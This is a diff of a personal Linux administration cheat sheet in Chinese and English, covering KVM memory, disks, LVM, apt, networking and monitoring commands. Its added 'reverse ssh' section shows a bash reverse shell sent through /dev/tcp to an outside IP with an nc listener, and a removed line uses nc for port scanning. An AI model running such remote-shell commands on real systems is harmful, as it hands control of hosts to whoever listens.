- 8916 qemu     /usr/libexec/qemu-kvm -name  7848556  3574368  3574522  3578952
- 8846 qemu     /usr/libexec/qemu-kvm -name  7435844  4074700  4075031  4080052
-24549 qemu     /usr/libexec/qemu-kvm -name  2004912  1487172  1487992  1493668
- 1270 qemu     /usr/libexec/qemu-kvm -name  1148468  2982392  2982546  2986932
- 8683 qemu     /usr/libexec/qemu-kvm -name   442012  5832732  5833257  5838404
-20225 qemu     /usr/libexec/qemu-kvm -name   347148  3965604  3966034  3971200
-清理swap。关闭VM后再开启
-[root@kvm-prod images]# free -g
-              total        used        free      shared  buff/cache   available
-Mem:             62          25           6           2          31          33
-Swap:            31           6          25
-
-[root@kvm-prod images]# smem -rs swap |grep qemu
-24549 qemu     /usr/libexec/qemu-kvm -name  2052244  1437352  1438494  1446368
- 1270 qemu     /usr/libexec/qemu-kvm -name  1151156  2979704  2979859  2984244
- 8683 qemu     /usr/libexec/qemu-kvm -name   443588  5831156  5831504  5836828
-20225 qemu     /usr/libexec/qemu-kvm -name   347268  3965484  3965833  3971080
-25944 root     grep --color=auto qemu             0      224      229      992
-25452 qemu     /usr/libexec/qemu-kvm -name        0  2200692  2202220  2210760
-24357 qemu     /usr/libexec/qemu-kvm -name        0  2613064  2614592  2623132
-23343 qemu     /usr/libexec/qemu-kvm -name        0  3080640  3082168  3090708
-
-#保存iptables规则
-[root@fuel ~]# /usr/libexec/iptables/iptables.init save
-iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]
-
-
-###########most expensive i/o process################
-dstat --aio --io --disk --tcp --top-io-adv --top-bio-adv
-
-#########ubuntu16.04支持nbd#########
-modprobe nbd max_part=16
-
-git pull = git fetch + git merge
-git merge fast-forward
-############确认硬盘位置###########
-root@node-14:/dev/disk# lspci -v |grep -A1 RAID
-02:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS 2008 [Falcon] (rev 03)
-        Subsystem: Dell PERC H310 Mini Monolithics
---
-04:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS 2008 [Falcon] (rev 03)
-        Subsystem: Dell PERC H310 Adapter
-结合idrac查看是哪个raid卡。注意：idrac中物理硬盘的名称与lsscsi里位置对不上。
-root@node-14:/proc/scsi# dmesg|grep sdj|grep FAILED
-[7779092.592470] sd 7:0:2:0: [sdj] tag#0 FAILED Result: hostbyte=DID_OK driverbyte=DRIVER_SENSE
-root@node-14:/dev/disk# lsscsi
-[0:2:0:0]    disk    DELL     PERC H310        2.12  /dev/sda
-[0:2:1:0]    disk    DELL     PERC H310        2.12  /dev/sdb
-[0:2:2:0]    disk    DELL     PERC H310        2.12  /dev/sdc
-[0:2:3:0]    disk    DELL     PERC H310        2.12  /dev/sdd
-[0:2:4:0]    disk    DELL     PERC H310        2.12  /dev/sde
-[0:2:5:0]    disk    DELL     PERC H310        2.12  /dev/sdf
-[0:2:6:0]    disk    DELL     PERC H310        2.12  /dev/sdg
-[7:0:0:0]    disk    IBM-ESXS ST9900805SS      B552  /dev/sdh
-[7:0:1:0]    disk    IBM-ESXS ST9900805SS      B559  /dev/sdi
-[7:0:2:0]    disk    IBM-ESXS ST9900805SS      B552  /dev/sdj
-[7:0:3:0]    disk    IBM-ESXS ST9900805SS      B552  /dev/sdk
-[7:0:4:0]    disk    IBM-ESXS ST9900805SS      B552  /dev/sdl
-[7:0:5:0]    disk    IBM-ESXS ST9900805SS      B559  /dev/sdm
-[7:0:6:0]    disk    IBM-ESXS ST9900805SS      B552  /dev/sdn
-[7:0:7:0]    disk    IBM-ESXS ST9900805SS      B559  /dev/sdo
-root@node-14:/proc/scsi# cat /proc/scsi/scsi
-Attached devices:
-Host: scsi0 Channel: 02 Id: 00 Lun: 00
-  Vendor: DELL     Model: PERC H310        Rev: 2.12
-  Type:   Direct-Access                    ANSI  SCSI revision: 05
-...........
-Host: scsi0 Channel: 02 Id: 06 Lun: 00
-  Vendor: DELL     Model: PERC H310        Rev: 2.12
-  Type:   Direct-Access                    ANSI  SCSI revision: 05
-Host: scsi7 Channel: 00 Id: 00 Lun: 00
-  Vendor: IBM-ESXS Model: ST9900805SS      Rev: B552
-  Type:   Direct-Access                    ANSI  SCSI revision: 06
-Host: scsi7 Channel: 00 Id: 01 Lun: 00
-  Vendor: IBM-ESXS Model: ST9900805SS      Rev: B559
-  Type:   Direct-Access                    ANSI  SCSI revision: 06
-Host: scsi7 Channel: 00 Id: 02 Lun: 00
-  Vendor: IBM-ESXS Model: ST9900805SS      Rev: B552
-  Type:   Direct-Access                    ANSI  SCSI revision: 06
-.......
-Host: scsi7 Channel: 00 Id: 07 Lun: 00
-  Vendor: IBM-ESXS Model: ST9900805SS      Rev: B559
-  Type:   Direct-Access                    ANSI  SCSI revision: 06
-
-
-
-#########进制转换#############
-ibase是输入数字的进制，而obase就是输出数字的进制了。很好记，i是input，o是output。
-　　如果用一条命令来转数字，可以用echo命令和管道结合bc。如下：
-　　10进制转2进制：
-　　$ echo "obase=2;ibase=10;100" | bc
-         1100100
-　　10进制转16进制：
-　　$ echo "obase=16;ibase=10;100" | bc
-         64
-　　16进制转10进制：
-　　$ echo "ibase=16;obase=2;F1" | bc
-        11110001
-
-redis-cli get ansible_facts127.0.0.1 |jq .ansible_memory_mb
-
-vmstat -a|awk 'NR==3{print hname " active " $6"\n" hname " inact " $5}' hname=`grep -i ^Hostname zabbix_agentd.conf |cut -d'=' -f2`
- 
-##########bonding#############
-rr mode0   balance-xor mode2   mode3   static link aggr
-802.3ad  mode4    LACP
-mode5  mode6      no need to config switch
- 
- ########rbd map disk without LVM################
- If you have multipath installed on your system, make sure it is stopped before mounting the volume.
- There is a bug which prevents the unmapping of RBD volumes.
- # service multipath-tools stop
- rbd map compute/309e1cca-69b4-468a-8455-91c2c80a0127_disk
-  fdisk -l /dev/rbd1
-  rbd showmapped
-  rbd unmap /dev/rbd1
-  
-###########rbd map disk with LVM ###########
- rbd map volumes/volume-e491793b-c42a-49dd-8861-af7541225815
- kpartx -av /dev/rbd0
- pvscan
- mount /dev/mapper/ubuntu--vg-root /mnt
- ...fix files in the filesystem..
- umount /mnt
- vi /etc/lvm/lvm.conf
- pvscan
- dmsetup ls
- dmsetup remove ubuntu--vg-swap_1 ubuntu--vg-root
- dmsetup ls
- dmsetup remove rbd0p5
- rbd unmap /dev/rbd0
- 
-###查询安装 升级 删除的dpkg包### 
-pars for fun: install | remove | rollback
-function apt-history(){
-
-      case "$1" in
-        install)
-              grep 'install ' /var/log/dpkg.log
-              ;;
-        upgrade|remove)
-              grep $1 /var/log/dpkg.log
-              ;;
-        rollback)
-              grep upgrade /var/log/dpkg.log | \
-                  grep "$2" -A10000000 | \
-                  grep "$3" -B10000000 | \
-                  awk '{print $4"="$5}'
-              ;;
-        *)
-              cat /var/log/dpkg.log
-              ;;
-      esac
-}
-###########ubuntu change default gateway#### temp
-ip route change default via 10.20.0.21 dev br-fw-admin
-
-slotid=`hpacucli ctrl all show status | grep 'Smart Array'|awk '{ print $6 }'`
-hpacucli ctrl slot=$slotid pd all show status
-hpacucli ctrl slot=$slotid ld all show status
-hpacucli ctrl slot=$slotid show detail |grep 'Battery/Capacitor'
-
-####################Ubuntu 16.04 手动升级内核##############
-要升级 Ubuntu 16.04 的内核，打开 http://kernel.ubuntu.com/~kernel-ppa/mainline/ 并选择列表中需要的版本（发布此文时最新内核是 4.10.1）。
-接下来，根据你的系统架构下载 .deb 文件：
-对于 64 位系统：
-wget http://10.67.51.158/ubuntu/pool/main/l/linux-lts-xenial/linux-headers-4.4.0-75-generic_4.4.0-75.96~14.04.1_amd64.deb
-wget http://10.67.51.158/ubuntu/pool/main/l/linux-lts-xenial/linux-image-4.4.0-75-generic_4.4.0-75.96~14.04.1_amd64.deb
-wget http://10.67.51.158/ubuntu/pool/main/l/linux-lts-xenial/linux-headers-4.4.0-75_4.4.0-75.96~14.04.1_all.deb
-linux-headers-4.15.0-29 linux-headers-4.15.0-29-generic linux-image-4.15.0-29-generic linux-modules-4.15.0-29-generic linux-modules-extra-4.15.0-29-generic
-这是 32 位系统：
-$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.1/linux-headers-4.10.1-041001_4.10.1-041001.201702260735_all.deb
-$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.1/linux-headers-4.10.1-041001-generic_4.10.1-041001.201702260735_i386.deb
-$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.1/linux-image-4.10.1-041001-generic_4.10.1-041001.201702260735_i386.deb
-下载完成这些所有内核文件后，如下安装：
-$ sudo dpkg -i *.deb
-安装完成后，重启并验证新的内核已经被使用了：
-$ uname -sr
-就是这样。你下载就可以使用比 Ubuntu 16.04 默认安装的内核的更新版本了。
-###############apt-get 升级指定包############
-root@zabbix-openstack:~# apt-get update
-root@zabbix-openstack:~# apt-cache policy openssh-client
-openssh-client:
-  Installed: 1:7.2p2-4ubuntu2.2
-  Candidate: 1:7.2p2-4ubuntu2.8
-  Version table:
-     1:7.2p2-4ubuntu2.8 500
-        500 http://10.67.51.164/ubuntu xenial-updates/main amd64 Packages
-        500 http://10.67.51.164/ubuntu xenial-security/main amd64 Packages
- *** 1:7.2p2-4ubuntu2.2 100
-        100 /var/lib/dpkg/status
-     1:7.2p2-4 500
-        500 http://10.67.51.164/ubuntu xenial/main amd64 Packages
-
-apt-get --only-upgrade install Package
-###################apt-get升级内核###################
-使用apt-get
-apt-get upgrade
-apt-get dist-upgrade           升级kernel
-
-先改变sources.list，然後apt-get upgrade & apt-get dist-upgrade  可升级release
-
-sudo apt-get install update-manager-core 
-sudo do-release-upgrade
-LTS systems are only automatically considered for an upgrade to the next LTS via do-release-upgrade with the first point release. 
-So for example 14.04 will only upgrade once 16.04.1 is released.
-
-Traditionally, Debian releases have been upgradeable by changing Apt's /etc/apt/sources.list, 
-which specifies package repositories, and using apt-get dist-upgrade to perform the upgrade itself. 
-Ubuntu is still a Debian-derived distribution, so this process would likely still work. 
-Instead, however, we'll use do-release-upgrade, a tool provided by the Ubuntu project, 
-which handles checking for a new release, updating sources.list, and a range of other tasks. 
-This is the officially recommended upgrade path for server upgrades which must be performed over a remote connection.
-
-Before doing a release upgrade, create a snapshot of your Droplet. 
-Upgrading releases can lead to some rather unexpected results if your application 
-isn't compatible with new software versions that will be installed when you upgrade.
-
-For example, I'll use PHP. Older Ubuntu versions have PHP 5.x in their repositories 
-while the newer releases have PHP 7.0.x. When performing a release upgrade, PHP 5.x becomes 7.0.x, 
-so any PHP applications on the server that are not fully compatible with PHP 7.0 break instantly.
-
-The same is true for many languages.
-##############apt-mirror behind proxy ######
-apt-get install apt-mirror
-Configure wget (which is used by apt-mirror) to go through 
-the http proxy by editing /etc/wgetrc and enabling the following options
- (skip this one if you aren’t using a http proxy to connect to the internet)
-http_proxy
-use_proxy
-su - apt-mirror -c apt-mirror
-
-###########kvm manual migration#########
-[root@kvmserver-ops ~]# cat copy.sh
-#!/bin/bash
-vmlist=`virsh list --all|sed -n '1,2!p'|awk '{print $2}'`
-for u in $vmlist
-do
-file=`virsh domblklist $u|awk '/qcow2/{print $2}'`
-date | tee -a /root/copy.log
-echo "start to scp $file..."|tee -a /root/copy.log
-scp $file kvmserver2:/var/lib/libvirt/images
-echo "copy of $file is completed !!"|tee -a /root/copy.log
-done
-
-
-#########linux tcp monitoring#######
-查看系统tcp连接中各个状态的连接数
- 
-netstat -an | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'
- 
-输出每个ip的连接数，以及总的各个状态的连接数。
- 
-netstat -n | awk '/^tcp/ {n=split($(NF-1),array,":");if(n<=2)++S[array[(1)]];else++S[array[(4)]];++s[$NF];++N} END {for(a in S){printf("%-20s %s\n", a, S[a]);++I}printf("%-20s %s\n","TOTAL_IP",I);for(a in s) printf("%-20s %s\n",a, s[a]);printf("%-20s %s\n","TOTAL_LINK",N);}'
-
-###########linux network###########
-Linux 上配置网络设备命令举例
-以 Redhat6.2 红帽Linux 发行版为例，如果已安装 VLAN 内核模块和管理工具 vconfig，TAP/TUN 设备管理工具 tunctl，那麽可以用以下命令设置前述网络设备：
-Bridge 操作
-* 创建 Bridge：brctl addbr [BRIDGE NAME]
-* 删除 Bridge：brctl delbr [BRIDGE NAME]
-* attach 设备到 Bridge：brctl addif [BRIDGE NAME] [DEVICE NAME]
-* 从 Bridge detach 设备：brctl delif [BRIDGE NAME] [DEVICE NAME]
-* 查询 Bridge 情况：brctl show
-
-VLAN 设定
-* 创建 VLAN 设备：vconfig add [PARENT DEVICE NAME] [VLAN ID]
-* 删除 VLAN 设备：vconfig rem [VLAN DEVICE NAME]
-* 设置 VLAN 设备 flag：vconfig set_flag [VLAN DEVICE NAME] [FLAG] [VALUE]
-* 设置VLAN 设备qos：
--- vconfig set_egress_map [VLAN DEVICE NAME] [SKB_PRIORITY] [VLAN_QOS]
--- vconfig set_ingress_map [VLAN DEVICE NAME] [SKB_PRIORITY] [VLAN_QOS]
-* 查询VLAN 设备情况：cat /proc/net/vlan/[VLAN DEVICE NAME]
-
-VETH & TAP 设定
-* 创建 VETH 设备：ip link add link [DEVICE NAME] type veth
-* 创建 TAP 设备：tunctl -p [TAP DEVICE NAME]
-* 删除 TAP 设备：tunctl -d [TAP DEVICE NAME]
-* 查询系统里所有二层设备，包括 VETH/TAP 设备：ip link show
-
-其他相关设定
-* 删除普通二层设备：ip link delete [DEVICE NAME] type [TYPE]
-
-######rhel5.8 using virtio ##########
-mkinitrd --with virtio_pci --with virtio_blk --with virtio -f /boot/initrd-$(uname-r).img $(uname -r)
 
 ##########dpkg ##########
 Ubuntu中所有packages的信息都在/var/lib/dpkg/目录下,其中子目录”/var/lib/dpkg/info”用于保存各个软件包的配置文件列表.不同后缀名代表不同类型的文件,如:
@@ -750,7 +267,6 @@ aptitude autoclean #仅删除过期的包文件
 可以使用apt-get clean以释放更多空间。这个命令会将已安装软件包裹的.deb文件一并删除。
 大多数情况下您不会再用到这些.debs文件，因此如果您为磁盘空间不足 而感到焦头烂额，这个办法也许值得一试： apt-get autoclean
 
-来自: http://man.linuxde.net/apt-get
 ###########xen server##########
 xe-toolstack-restart >> will shutdown halted yellow vm and then you could delete it. 
 using uuid as above or manually right click and delete it.
@@ -768,152 +284,371 @@ Commands to remove the Virtual Disks:
 xe vdi-destroy uuid=9292d664-81b8-75b1-a251-7ca4e0f4eceb
 xe vdi-destroy uuid=0a553992-c048-445c-99cf-a0c872a7ff57
 
-
 ################parted############
 parted /dev/sdb mklabel gpt yes
 parted /dev/sdb mkpart primary 0 100% ignore
 parted /dev/sda mkpart primary 216G 416G ignore
 parted /dev/sda p
- partprobe /dev/sda
- lvextend -l +100%FREE -r /dev/mapper/os-root
-###############jenkins#############
+partprobe /dev/sda
+lvextend -l +100%FREE -r /dev/mapper/os-root
+ 
+###########run in background######
+nohup cmd &
+setsid cmd
+(cmd &)
+CTRL-z    disown -h %1      https://linux.cn/article-7170-1.html
+screen
 
-yum install java-1.7.0-openjdk
-curl -o jenkins.repo http://pkg.jenkins-ci.org/redhat-stable/jenkins.repo
-rpm --import https://jenkins-ci.org/redhat/jenkins-ci.org.key
-yum install -y jenkins
+##########backup file permission#########
+backup:   getfacl -R . > permission.txt
+restore:  setfacl --restore=permission.txt
 
-########SSL
-java InstallCert 10.67.44.66
-cp jssecacerts /etc/alternatives/jre/lib/security/
-keytool -list -alias 10.67.44.66-1
-openssl s_client -connect 10.67.44.66:443 < /dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > public.crt
-keytool -import -alias 10.67.44.66-1 -keystore /etc/alternatives/jre/lib/security/cacerts -file public.crt
-java SSLPoke 10.67.44.66 443
-################dante################
-[root@proxy ~]# cat /etc/sockd.conf
-internal: ens9   port = 1080
-external: eth1
+######################################### extend FS###########################
+extend /swdist/repos2
+# lvextend -L 25G /dev/mapper/vgsys0-lvrepos2
+# resize2fs /dev/mapper/vgsys0-lvrepos2
 
-user.privileged:   root
-user.unprivileged: nobody
-socksmethod:       none
-errorlog: /var/log/sockd.errlog
-logoutput: /var/log/sockd.log
+####################recreate fs and restore via TSM###########################
+umount /media/target/usr 
+mkfs -t ext3 /dev/mapper/vgsys0-lvusr 
+mount /dev/mapper/vgsys0-lvusr /media/target/usr 
+dsmc rest "/usr/*" /media/target/usr -sub=yes 
+dsmc q backup "/etc/openldap/slapd.conf"
+dsmc rest -pitd=04/16/2015 -pitt=15:08:51 "/etc/openldap/slapd.conf" /home/chensen/slapd.conf
 
-# LAN
-client pass {
-    from: 10.67.50.0/23 to: 0.0.0.0/0
-    log: error connect # disconnect
-}
+################via /dev/disk/by-id########
+fdisk scsi-3600a0b80002652e00000d5e94d9e9886
+fdisk scsi-3600a0b80002652e00000d5e84d9e9816
+fdisk scsi-3600a0b80002652e00000d5e74d9e97c6
+pvcreate /dev/mapper/3600a0b80002652e00000d5e94d9e9886-part1
+pvcreate /dev/mapper/3600a0b80002652e00000d5e84d9e9816-part1
+pvcreate /dev/mapper/3600a0b80002652e00000d5e74d9e97c6-part1
+vgcreate testvg0 /dev/mapper/3600a0b80002652e00000d5e74d9e97c6-part1 /dev/mapper/3600a0b80002652e00000d5e84d9e9816-part1 /dev/mapper/3600a0b80002652e00000d5e94d9e9886-part1
 
-# allow connect from anywhere as long as client was authed previously
-socks pass {
-    from: 0.0.0.0/0 to: 0.0.0.0/0
-    command: connect
-    log: error connect # disconnect
-}
-[root@cobbler ansible]# cat ~/.ssh/config
-#Host 10.20.0.8
-#  ProxyCommand connect-proxy -S 10.67.51.159 %h %p
-Host 10.20.0.*
-  ProxyCommand connect-proxy -S 10.67.51.159 %h %p
+######scan disk added in vmware vm########
+cd /sys/class/scsi_host/host0
+echo "- - -" >scan
+fdisk /dev/sdc
+partprobe
+pvcreate /dev/sdc1
+pvs
+vgextend vgdata0 /dev/sdc1
+lvcreate -L 2500M -n centos7_newvol vg_newlvm
+mkfs.ext3 
+mkdir
+mount
+
+lvcreate -l +100%FREE -n data es
+----------------online----------------
+cd /sys/class/scsi_host/host0   #host1 host2 ....
+echo "- - -" >scan
+pvcreate /dev/sdc
+pvs
+vgextend vgdata0 /dev/sdc
+lvextend -L +20G -r /dev/mapper/vgdata0-lvdb2itim
+resize2fs
+----------------offline---------------
+umount /dev/mapper/vgsys1-lvdbarc1
+
+tune2fs -O ^has_journal /dev/mapper/vgsys1-lvdbarc1
+
+tune2fs -j -J size=100 /dev/mapper/vgsys1-lvdbarc1
+
+fsck /dev/mapper/vgsys1-lvdbarc1
+
+dumpe2fs /dev/mapper/vgsys1-lvdbarc1|grep clean
+
+resize2fs /dev/mapper/vgsys1-lvdbarc1
+
+lvextend -L +15G /dev/mapper/vgsys1-lvdbarc1
+
+resize2fs /dev/mapper/vgsys1-lvdbarc1
+
+mount /dev/mapper/vgsys1-lvdbarc1 /db2/archlog/db2inst1
+
+############vmware tool version############
+# dsh -M -f djs_srvlist -c "sudo /usr/bin/vmware-config-tools.pl --help 2>&1|grep Tools"
+
+###########RPM##############
+RPM can handle most of the permissions / ownerhsip problems
+
+rpm --setugids PACKAGE
+rpm --setperms PACKAGE
+
+######gpg #############
+gpg -c your_file.txt
+gpg -d your_file.txt.gpg > your_file.txt
+
+###########Checking for patterns tied to CPU X#########
+NOTE [psr] is the processor number where the [comm]and is running.
+
+ps -eo psr,pid,tid,class,rtprio,ni,pri,pcpu,stat,wchan:14,comm --sort=psr | sort -nr
+[root@kvm-prod ~]# ps -eo psr,pid,tid,class,rtprio,ni,pri,pcpu,stat,wchan:14,comm --sort=psr | sort -nr |grep gnome-session
+ 27  3958  3958 TS       -   0  19  0.0 Sl   poll_schedule_ gnome-session
+ 25  5282  5282 TS       -   0  19  0.0 Sl   poll_schedule_ gnome-session
+ 10  6162  6162 TS       -   0  19  0.0 Sl   poll_schedule_ gnome-session
+  6  3938  3938 TS       -   0  19  0.0 Sl   poll_schedule_ gnome-session
+  0  5281  5281 TS       -   0  19  0.0 Sl   poll_schedule_ gnome-session
+  0  3262  3262 TS       -   0  19  0.0 Ssl  poll_schedule_ gnome-session
+
+############ipcalc#############
+[root@oc1181188062 ~]# ipcalc -p 10.12.218.255 255.255.252.0
+PREFIX=22
+[root@oc1181188062 ~]# ipcalc -n 10.12.218.255/22
+NETWORK=10.12.216.0
+[root@oc1181188062 ~]# ipcalc -b 10.12.218.22/24
+BROADCAST=10.12.218.255
+[root@oc1181188062 ~]# ipcalc -m 10.12.218.22/22
+NETMASK=255.255.252.0
+
+#############diff sdiff##########
+ifconfig |diff -y - 123.txt
+ifconfig |sdiff -w 132 - 123.txt
+
+############ksar###########
+# LC_TIME="POSIX" sar -f sa30 -A  | tee sar30 
+# ksar -input file:///home/sam/sar25 -outputPDF sar25.pdf
+
+####################swap#################
+top -> O -> p
+smem  -rs swap
+
+pidof memcached
+pgrep memcached
+grep --color VmSwap /proc/48440/status
+
+#########进制转换#############
+ibase是输入数字的进制，而obase就是输出数字的进制了。很好记，i是input，o是output。
+　　如果用一条命令来转数字，可以用echo命令和管道结合bc。如下：
+　　10进制转2进制：
+　　$ echo "obase=2;ibase=10;100" | bc
+         1100100
+　　10进制转16进制：
+　　$ echo "obase=16;ibase=10;100" | bc
+         64
+　　16进制转10进制：
+　　$ echo "ibase=16;obase=2;F1" | bc
+        11110001
 
 
-###################mrepo##############
-[root@yumserver6 mrepo.conf.d]# grep createrepo-options /usr/bin/mrepo
-        self.createrepooptions = self.getoption('main', 'createrepo-options', '-p -s sha1')    ###centos5用sha1的加密算法
+#########linux tcp monitoring#######
+查看系统tcp连接中各个状态的连接数
+ 
+netstat -an | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'
+ 
+输出每个ip的连接数，以及总的各个状态的连接数。
+ 
+netstat -n | awk '/^tcp/ {n=split($(NF-1),array,":");if(n<=2)++S[array[(1)]];else++S[array[(4)]];++s[$NF];++N} END {for(a in S){printf("%-20s %s\n", a, S[a]);++I}printf("%-20s %s\n","TOTAL_IP",I);for(a in s) printf("%-20s %s\n",a, s[a]);printf("%-20s %s\n","TOTAL_LINK",N);}'
 
+###########SFP Module#########
+[root@cobbler ~]# ansible openstack -m shell -a "ethtool -m eno1 |egrep 'Vendor name|Vendor PN'"
+10.21.0.5 | CHANGED | rc=0 >>
+        Vendor name                               : AOI
+        Vendor PN                                 : A7EL-SN85-ADMA
+		
+######## nslookup查询dns记录 ##########
+C:\Users\chensen>nslookup -q=txt hp.com
+C:\Users\chensen>nslookup -q=SRV _ldap._tcp.cesbg.foxconn
 
-[CentOS5]
-name = CentOS $release ($arch)
-release = 5
-arch = x86_64
-metadata = yum repomd
+##########################kill subshells in process group##############
+kill -- -$$
 
-#iso=CentOS-5.11-x86_64-bin-DVD1.iso
-os=http://mirrors.aliyun.com/centos/$release/os/$arch/CentOS/
-updates=http://mirrors.aliyun.com/centos/$release/updates/$arch/RPMS/
-extras=http://mirrors.aliyun.com/centos/$release/extras/$arch/RPMS/
-epel=http://mirrors.aliyun.com/epel/5/$arch/
+Explanation:
 
+$$ gives us the PID of the running shell. So, kill $$ would send a SIGTERM to the shell process. However, if we negate the PID, kill sends a SIGTERM to every process in the process group. We need the -- beforehand so kill knows that -$$ is a process group ID and not a flag.
 
-[CentOS6]
-name = CentOS $release ($arch)
-release = 6
-arch = x86_64
-metadata = yum repomd
+Note that this relies on the running shell being a process group leader! Otherwise, $$ (the PID) will not match the process group ID, and you end up sending a signal to who knows where (well, probably nowhere as there is unlikely to be a process group with a matching ID if we're not a group leader).
+########################################fsck#######################
+fsck must only be run on unmounted filesystems, never on mounted filesystems (with the exception of the read-only root during startup). This is because it accesses the raw disk, and can therefore modify the filesystem without the operating system realizing it. There will be trouble, if the operating system is confused.
+Running fsck on a partition mounted read-write would be silly, even with fsck in read-only mode. The filesystem will change under fsck, and in-memory data that fsck caches from the filesystem will become invalid (and thus fsck will see inconsistency). You can run fsck on a read-only mounted filesystem in read-only mode and get valid results. Running fsck in read/write mode on a read-only mounted filsystem would cause the kernel to see filesystem structures changing unexpectedly underneath it, and that would also be bad.
+Do not run fsck on a mounted filesystem! If you run fsck on a filesystem that is currently mounted, you will (at best) receive an error message, and (at worst) corrupt your filesystem data. If you're going to check your filesystem with fsck, drop into single-user mode and make sure the filesystem is unmounted before you proceed.
+in secure mode: choose SKIP
+lvm pvscan  (in the case of LVM)
+lvm vgscan
+lvm lvscan
+lvm vgchange -ay VolGroup00
+fsck -t ext3 /dev/VolGroup00/LogVol00
 
-#iso=CentOS-6.5-x86_64-bin-DVD1.iso
-os=http://mirrors.aliyun.com/centos/$release/os/$arch/Packages/
-updates=http://mirrors.aliyun.com/centos/$release/updates/$arch/Packages/
-extras=http://mirrors.aliyun.com/centos/$release/extras/$arch/Packages/
-epel=http://mirrors.aliyun.com/epel/6/$arch/
+###############reverse ssh###############
+######me######
+[root@oc1181188062 ~]# nc -vv -l 1234
+Connection from 4.10.8.5 port 1234 [tcp/search-agent] accepted
+stty: standard input: Invalid argument
+[chensen@target ~]$ ip a
 
-cat /etc/mrepo.conf
-### Configuration file for mrepo
+######target#######
+[chensen@target ~]$ bash -i > /dev/tcp/7.12.15.11/1234 0<&1 2>&1
 
-### The [main] section allows to override mrepo's default settings
-### The mrepo-example.conf gives an overview of all the possible settings
-[main]
-srcdir = /var/mrepo
-wwwdir = /var/www/mrepo
-confdir = /etc/mrepo.conf.d
-arch = x86_64
-http_proxy=http://10.67.61.205:808
-https_proxy=http://10.67.61.205:808
-ftp_proxy=http://10.67.61.205:808
-
-mailto = root@localhost
-smtp-server = localhost
-
-######################################
+######## lsof用法 ##########
 列出所有与192.168.56.1（我的宿主机IP地址）的ipv4连接：
 fgp@controller:~$ lsof -i 4@192.168.56.1
+[root@repo-centos ~]# [root@repo-centos ~]# lsof -P -i TCP
+COMMAND     PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
+sshd       1184 root    3u  IPv4   24526      0t0  TCP *:22 (LISTEN)
+sshd       1184 root    4u  IPv6   24528      0t0  TCP *:22 (LISTEN)
+master     1399 root   13u  IPv4   26178      0t0  TCP localhost:25 (LISTEN)
+master     1399 root   14u  IPv6   26179      0t0  TCP localhost:25 (LISTEN)
+sshd       2156 root    3u  IPv4   37081      0t0  TCP repo-centos:22->tjcesit-048.cesbg.foxconn:61699 (ESTABLISHED)
+docker-pr  2330 root    4u  IPv6   45579      0t0  TCP *:8084 (LISTEN)
+docker-pr  2455 root    4u  IPv6   36853      0t0  TCP *:80 (LISTEN)
+docker-pr  2546 root    4u  IPv6   47213      0t0  TCP *:8083 (LISTEN)
+docker-pr  3441 root    4u  IPv6   88901      0t0  TCP *:8082 (LISTEN)
+docker-pr  3774 root    4u  IPv6   91973      0t0  TCP *:8081 (LISTEN)
+docker-pr  3923 root    4u  IPv6   93367      0t0  TCP *:8080 (LISTEN)
+sshd       8437 root    3u  IPv4 1332763      0t0  TCP repo-centos:22->10.67.125.23:55836 (ESTABLISHED)
+sshd       9147 root    3u  IPv4 1344074      0t0  TCP repo-centos:22->10.67.125.23:56885 (ESTABLISHED)
+docker-pr  9287 root    4u  IPv6 1346711      0t0  TCP *:9000 (LISTEN)
+docker-pr  9301 root    4u  IPv6 1346725      0t0  TCP *:8000 (LISTEN)
+ssh       16906 root    3u  IPv4 1496867      0t0  TCP repo-centos:38706->10.67.51.158:22 (ESTABLISHED)
+sshd      22535 root    3u  IPv4 1051988      0t0  TCP repo-centos:22->tjcesit-048.cesbg.foxconn:49293 (ESTABLISHED)
+connect-p 22604 root    3u  IPv4 1058133      0t0  TCP repo-centos:56344->10.67.36.66:1080 (ESTABLISHED)
+[root@repo-centos ~]# ss -antl
+State      Recv-Q Send-Q                            Local Address:Port                                           Peer Address:Port
+LISTEN     0      100                                   127.0.0.1:25                                                        *:*
+LISTEN     0      128                                           *:22                                                        *:*
+LISTEN     0      100                                         ::1:25                                                       :::*
+LISTEN     0      128                                          :::8000                                                     :::*
+LISTEN     0      128                                          :::9000                                                     :::*
+LISTEN     0      128                                          :::8080                                                     :::*
+LISTEN     0      128                                          :::80                                                       :::*
+LISTEN     0      128                                          :::8081                                                     :::*
+LISTEN     0      128                                          :::8082                                                     :::*
+LISTEN     0      128                                          :::8083                                                     :::*
+LISTEN     0      128                                          :::8084                                                     :::*
+LISTEN     0      128                                          :::22                                                       :::*
+############## ngrep 查看包的内容############
+[root@vstjzabdb03 ~]# ngrep -d ens192 -q -i -W byline 'select' port 3306
+interface: ens192 (10.67.50.0/255.255.254.0)
+filter: ( port 3306 ) and ((ip || ip6) || (vlan && (ip || ip6)))
+match: select
 
-一个经典的用法是端口扫描。比如我要扫描192.168.56.2主机1~100端口
-nc -zv 192.168.56.2 1-100 |& grep 'succeeded!'
-###############firewall-cmd###############
-To open port 80 (http) in your firewall, you can utilize the following command:
-[root@srv ]# firewall-cmd --permanent --zone=public --add-port=80/tcp
- 
-Reload the firewall to apply changes:
-[root@srv ]# firewall-cmd --reload
-#############samba############
-smbclient -L //10.67.50.89 -U "cesbg\h7108579"
-smbclient --user="cesbg\h7108579" //10.67.50.89/OVA
-mount -t cifs -r -o username=cesbg/h7108579 //10.67.50.89/OVA /mnt/OVA
-mount -t cifs -r -o username=cesbg/h7108579 //10.67.50.93/IT /mnt/IT
-#################.functions##################
-dokeychainmagic() {
- checkagent=`ps auxww|egrep -v 'grep|defunct|gnome-session'|grep ^${USER}|grep -i ssh-agent|wc -l|awk '{print $1}'`
- if [ "${checkagent}" -eq "0" ]; then
-    check-agent
-    dokeychainmagic
- fi
+T 10.67.49.247:42040 -> 10.67.51.118:3306 [AP] #1
